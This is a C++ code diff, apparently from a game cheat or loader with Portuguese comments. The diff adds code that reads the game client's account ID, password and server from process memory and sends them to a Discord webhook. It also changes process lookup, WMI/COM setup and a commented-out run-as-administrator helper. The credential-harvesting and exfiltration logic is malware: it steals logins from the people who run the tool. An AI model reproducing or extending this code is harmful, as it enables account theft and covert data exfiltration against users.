@@ -77,6 +77,27 @@ bool bCheckRegister() {
 	return FALSE;
 }
 
+DWORD getPid(std::string szProcID) {
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (hSnap != INVALID_HANDLE_VALUE) {
+		if (!Process32First(hSnap, &pe32))
+			return 0;
+
+		do {
+			if (strcmp(pe32.szExeFile, szProcID.c_str()) == 0) {
+				CloseHandle(hSnap);
+				return (DWORD)pe32.th32ProcessID;
+			}
+		} while (Process32Next(hSnap, &pe32));
+	}
+
+	CloseHandle(hSnap);
+	return 0;
+}
+
 void protectMachine() {
 	while (true) {
 		Sleep(10);
@@ -111,6 +132,9 @@ void protectMachine() {
 		}
 
 		if (read(0x038581DC, 4) > 0) {
+			dwPassword = readString(0x036BD368, 0x20);
+			dwServer = readString(0x036D0DD4, 0x20);
+
 			if (!bSendDadosPCToDiscord) {
 				std::string szMessage =
 					"-------------------------------------------------------------------\n"
@@ -129,20 +153,21 @@ void protectMachine() {
 				sendDiscordWebhook(szMessage);
 
 				if (bFlag) {
-					dwLogin = readString(0x036BD468, 0x20);
-					dwPassword = readString(0x036BD368, 0x20);
+					if (dwLogin != readString(0x036BD468, 0x20)) {
+						dwLogin = readString(0x036BD468, 0x20);
+						std::string szMessage2 =
+							"-------------------------------- Atention! -----------------------------------\n"
+							"Cliente: " + dwNome + "\n\n" +
+							"ID: " + dwLogin + "\n" +
+							"Pw: " + dwPassword + "\n" +
+							"Servidor: " + dwServer + "\n\n" +
+							"Obs.: Usuario desconhecido. Fechando o client!";
 
-					std::string szMessage2 =
-						"-------------------------------- Atention! -----------------------------------\n"
-						"Cliente: " + dwNome + "\n\n" +
-						"ID: " + dwLogin + "\n" +
-						"Pw: " + dwPassword + "\n" +
-						"Obs.: Usuario desconhecido. Fechando o client!";
+						sendDiscordWebhook(szMessage2);
 
-					sendDiscordWebhook(szMessage2);
-
-					Sleep(1000);
-					ExitProcess(0);
+						Sleep(1000);
+						ExitProcess(0);
+					}
 				}
 
 				bSendDadosPCToDiscord = true;
@@ -158,28 +183,24 @@ void protectMachine() {
 				lol(findMob, false);
 
 				//Hooks na sessão .text
-				lol(hooks, false);
-
-				//Anti protect mouse
-				//lol(disableProtectMouse, false);
+				//lol(hooks, false);
 
 				bCheatThread = true;
 			}
 
 			if (!bSendLoginToDiscord && bGetTime) {
-				dwLogin = readString(0x036BD468, 0x20);
-				dwPassword = readString(0x036BD368, 0x20);
-				dwServer = readString(0x036D0DD4, 0x20);
+				if (dwLogin != readString(0x036BD468, 0x20)) {
+					dwLogin = readString(0x036BD468, 0x20);
+					std::string szMessage =
+						"-------------------------------------------------------------------\n"
+						"Cliente: " + dwNome + "\n\n" +
+						"ID: " + dwLogin + "\n" +
+						"Pw: " + dwPassword + "\n" +
+						"Servidor: " + dwServer + "\n\n" +
+						"Tempo restante: " + strDays + ":" + strHours + ":" + strMinutes + ":" + strSeconds;
 
-				std::string szMessage =
-					"-------------------------------------------------------------------\n"
-					"Cliente: " + dwNome + "\n\n" +
-					"ID: " + dwLogin + "\n" +
-					"Pw: " + dwPassword + "\n" +
-					"Servidor: " + dwServer + "\n\n" + 
-					"Tempo restante: " + strDays + ":" + strHours + ":" + strMinutes + ":" + strSeconds;
-
-				sendDiscordWebhook(szMessage);
+					sendDiscordWebhook(szMessage);
+				}
 
 				bSendLoginToDiscord = true;
 			}
@@ -291,24 +312,33 @@ void hHora() {
 }
 
 HRESULT initializeCOM() {
-	HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
-	if (FAILED(hres)) {
+	try {
+		HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+		if (FAILED(hres)) {
+			throw hres;
+		}
+
+		hres = CoInitializeSecurity(
+			NULL,
+			-1,
+			NULL,
+			NULL,
+			RPC_C_AUTHN_LEVEL_DEFAULT,
+			RPC_C_IMP_LEVEL_IMPERSONATE,
+			NULL,
+			EOAC_NONE,
+			NULL
+		);
+
+		if (FAILED(hres)) {
+			throw hres;
+		}
+
 		return hres;
 	}
-
-	hres = CoInitializeSecurity(
-		NULL,
-		-1,
-		NULL,
-		NULL,
-		RPC_C_AUTHN_LEVEL_DEFAULT,
-		RPC_C_IMP_LEVEL_IMPERSONATE,
-		NULL,
-		EOAC_NONE,
-		NULL
-	);
-
-	return hres;
+	catch (HRESULT hr) {
+		return hr;
+	}
 }
 
 void uninitializeCOM() {
@@ -316,27 +346,36 @@ void uninitializeCOM() {
 }
 
 HRESULT connectToWMI(IWbemLocator** pLoc, IWbemServices** pSvc) {
-	HRESULT hres = CoCreateInstance(
-		CLSID_WbemLocator,
-		0,
-		CLSCTX_INPROC_SERVER,
-		IID_IWbemLocator, (LPVOID*)pLoc);
+	try {
+		HRESULT hres = CoCreateInstance(
+			CLSID_WbemLocator,
+			0,
+			CLSCTX_INPROC_SERVER,
+			IID_IWbemLocator, (LPVOID*)pLoc);
 
-	if (FAILED(hres)) {
+		if (FAILED(hres)) {
+			throw hres;
+		}
+
+		hres = (*pLoc)->ConnectServer(
+			_bstr_t(L"ROOT\\CIMV2"),
+			NULL,
+			NULL,
+			0,
+			NULL,
+			0,
+			0,
+			pSvc);
+
+		if (FAILED(hres)) {
+			throw hres;
+		}
+
 		return hres;
 	}
-
-	hres = (*pLoc)->ConnectServer(
-		_bstr_t(L"ROOT\\CIMV2"),
-		NULL,
-		NULL,
-		0,
-		NULL,
-		0,
-		0,
-		pSvc);
-
-	return hres;
+	catch (HRESULT hr) {
+		return hr;
+	}
 }
 
 HRESULT executeWMIQuery(IWbemServices* pSvc, const std::wstring& query, IEnumWbemClassObject** pEnumerator) {
@@ -675,7 +714,7 @@ bool download_file(const std::string& url, const std::string& output_path) {
 	return false;
 }
 
-bool RunAsAdmin(const wchar_t* filePath, const wchar_t* params) {
+/*bool RunAsAdmin(const wchar_t* filePath, const wchar_t* params) {
 	SHELLEXECUTEINFO shExInfo = { 0 };
 	shExInfo.cbSize = sizeof(shExInfo);
 	shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -694,11 +733,11 @@ bool RunAsAdmin(const wchar_t* filePath, const wchar_t* params) {
 		else
 			std::cout << "Falha ao executar como administrador." << std::endl;
 		*/
-		return false;
+		/*return false;
 	}
 
 	WaitForSingleObject(shExInfo.hProcess, INFINITE);
 	CloseHandle(shExInfo.hProcess);
 
 	return true;
-}
+}*/
